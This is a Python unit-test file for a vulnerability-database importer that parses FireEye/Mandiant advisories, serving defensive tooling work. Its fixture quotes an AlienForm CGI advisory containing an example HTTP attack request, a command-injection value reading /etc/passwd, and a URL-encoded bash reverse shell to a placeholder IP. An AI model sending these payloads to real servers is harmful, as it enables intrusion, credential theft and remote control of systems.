#
# Copyright (c) nexB Inc. and others. All rights reserved.
# VulnerableCode is a trademark of nexB Inc.
# SPDX-License-Identifier: Apache-2.0
# See http://www.apache.org/licenses/LICENSE-2.0 for the license text.
# See https://github.com/nexB/vulnerablecode for support or download.
# See https://aboutcode.org for more information about nexB OSS projects.
#
import json
import os
from unittest import TestCase

from vulnerabilities.importer import Reference
from vulnerabilities.importers.fireeye import get_aliases
from vulnerabilities.importers.fireeye import get_references
from vulnerabilities.importers.fireeye import md_list_to_dict
from vulnerabilities.importers.fireeye import parse_advisory_data
from vulnerabilities.tests import util_tests

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEST_DATA = os.path.join(BASE_DIR, "test_data/fireeye")


class TestFireeyeImporter(TestCase):
    def test_md_list_to_dict(self):
        md_list = [
            "# FEYE-2020-0004",
            "## Description",
            "AlienForm v2.0.2 CGI script is vulnerable to remote code execution leading to server compromise by attackers. This vulnerability could be a derivative or unexplored area of CVE-2002-0934.",
            "## Impact",
            "High - Successful exploitation of this vulnerability results in the attacker remotely executing code on the affected systems. Remote code execution could lead to complete system compromise and the ability to gain access to user credentials and/or move laterally throughout the compromised environment.",
            "## Exploitability",
            "High - An attacker needs only to identify the affected CGI script is present on the server; a simple directory brute force can reveal the presence of the vulnerable CGI file.",
            "## CVE Reference",
            "CVE-2020-10948",
            "## Technical Details",
            "Mandiant discovered the affected server is vulnerable to command injection in CGI argument parameters",
            "Affected URL:",
            "http://<affected host>//cgibin/af2.cgi",
            "Example attack payload:",
            "POST //cgibin/af2.cgi HTTP/1.1 <br>",
            "Host: <affected host> <br>",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 <br>",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 <br>",
            "Accept-Language: en-US,en;q=0.5 <br>",
            "Accept-Encoding: gzip, deflate <br>",
            "Connection: close <br>",
            "Upgrade-Insecure-Requests: 1 <br>",
            "Content-Length: 38 <br>",
            "_browser_out=%7Ccat%20/etc/passwd%7C",
            "Reverse Shell Example:",
            "_browser_out=%7Cbash+-i+>%26+/dev/tcp/<IP>/8080+0>%261%7C",
            "## Resolution",
            "Defunct software no longer support by vendor; not fixed.  FireEye Mandiant recommends disabling the affected CGI Script and to avoid using legacy CGI scripts in environments which do not have security support.",
            "## Discovery Credits",
            "Nikhith Tummalapalli, Mandiant FireEye",
            "## Disclosure Timeline",
            "- 19 Dec 2019: Attempted to email Jon Hedley, jon(at)cgi.tj, to report bug; email was bounced back",
            "- 19 Dec 2019: Searched for other contacts for Jon Hedley and Alienform via Linked-In and Twitter...no resulting contact information",
            "- 19 Dec 2019: Determined company was defunct and software is no longer maintained.  The primary search results online were related to CVE-2002-0934, to which this bug is related and/or induced by its fix.",
            "- 24 Mar 2020: Searched again online for new updates to AlienForm contact information; produced same results as previous.",
            "- 24 Mar 2020: Reserved CVE with Mitre after 90 days",
            "- 1 April 2020: Posted and notified Mitre of reference",
            "## References ",
            "- http://1-4a.com/cgi-bin/alienform/af.cgi",
            "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0934",
            "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10948",
        ]
        assert md_list_to_dict(md_list) == {
            "# FEYE-2020-0004": [],
            "## Description": [
                "AlienForm v2.0.2 CGI script is vulnerable to remote code execution leading to server compromise by attackers. This vulnerability could be a derivative or unexplored area of CVE-2002-0934."
            ],
            "## Impact": [
                "High - Successful exploitation of this vulnerability results in the attacker remotely executing code on the affected systems. Remote code execution could lead to complete system compromise and the ability to gain access to user credentials and/or move laterally throughout the compromised environment."
            ],
            "## Exploitability": [
                "High - An attacker needs only to identify the affected CGI script is present on the server; a simple directory brute force can reveal the presence of the vulnerable CGI file."
            ],
            "## CVE Reference": ["CVE-2020-10948"],
            "## Technical Details": [
                "Mandiant discovered the affected server is vulnerable to command injection in CGI argument parameters",
                "Affected URL:",
                "http://<affected host>//cgibin/af2.cgi",
                "Example attack payload:",
                "POST //cgibin/af2.cgi HTTP/1.1 <br>",
                "Host: <affected host> <br>",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 <br>",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 <br>",
                "Accept-Language: en-US,en;q=0.5 <br>",
                "Accept-Encoding: gzip, deflate <br>",
                "Connection: close <br>",
                "Upgrade-Insecure-Requests: 1 <br>",
                "Content-Length: 38 <br>",
                "_browser_out=%7Ccat%20/etc/passwd%7C",
                "Reverse Shell Example:",
                "_browser_out=%7Cbash+-i+>%26+/dev/tcp/<IP>/8080+0>%261%7C",
            ],
            "## Resolution": [
                "Defunct software no longer support by vendor; not fixed.  FireEye Mandiant recommends disabling the affected CGI Script and to avoid using legacy CGI scripts in environments which do not have security support."
            ],
            "## Discovery Credits": ["Nikhith Tummalapalli, Mandiant FireEye"],
            "## Disclosure Timeline": [
                "- 19 Dec 2019: Attempted to email Jon Hedley, jon(at)cgi.tj, to report bug; email was bounced back",
                "- 19 Dec 2019: Searched for other contacts for Jon Hedley and Alienform via Linked-In and Twitter...no resulting contact information",
                "- 19 Dec 2019: Determined company was defunct and software is no longer maintained.  The primary search results online were related to CVE-2002-0934, to which this bug is related and/or induced by its fix.",
                "- 24 Mar 2020: Searched again online for new updates to AlienForm contact information; produced same results as previous.",
                "- 24 Mar 2020: Reserved CVE with Mitre after 90 days",
                "- 1 April 2020: Posted and notified Mitre of reference",
            ],
            "## References ": [
                "- http://1-4a.com/cgi-bin/alienform/af.cgi",
                "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0934",
                "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10948",
            ],
        }

    def test_get_ref(self):
        assert get_references(
            [
                "- http://1-4a.com/cgi-bin/alienform/af.cgi",
                "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0934",
                "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10948",
            ]
        ) == [
            Reference(url="http://1-4a.com/cgi-bin/alienform/af.cgi"),
            Reference(url="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0934"),
            Reference(url="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10948"),
        ]
        assert get_references(
            [
                "- [Mitre CVE-2021-42712](https://www.cve.org/CVERecord?id=CVE-2021-42712)",
            ]
        ) == [
            Reference(url="https://www.cve.org/CVERecord?id=CVE-2021-42712"),
        ]
        assert get_references(
            [
                "[Mitre CVE-2021-42712](https://www.cve.org/CVERecord?id=CVE-2021-42712)",
            ]
        ) == [
            Reference(url="https://www.cve.org/CVERecord?id=CVE-2021-42712"),
        ]
        assert get_references([]) == []

    def test_get_aliases(self):
        assert get_aliases("MNDT-2021-0012", ["CVE-2021-44207"]) == [
            "CVE-2021-44207",
            "MNDT-2021-0012",
        ]
        assert get_aliases("MNDT-2021-0012", []) == ["MNDT-2021-0012"]

    def test_parse_advisory_data_1(self):
        with open(os.path.join(TEST_DATA, "fireeye_test1.md")) as f:
            mock_response = f.read()
        expected_file = os.path.join(TEST_DATA, f"fireeye_test1_expect.json")

        imported_data = parse_advisory_data(mock_response)
        result = imported_data.to_dict()

        util_tests.check_results_against_json(result, expected_file)

    def test_parse_advisory_data_2(self):
        with open(os.path.join(TEST_DATA, "fireeye_test2.md")) as f:
            mock_response = f.read()
        expected_file = os.path.join(TEST_DATA, f"fireeye_test2_expect.json")
        imported_data = parse_advisory_data(mock_response)
        result = imported_data.to_dict()

        util_tests.check_results_against_json(result, expected_file)
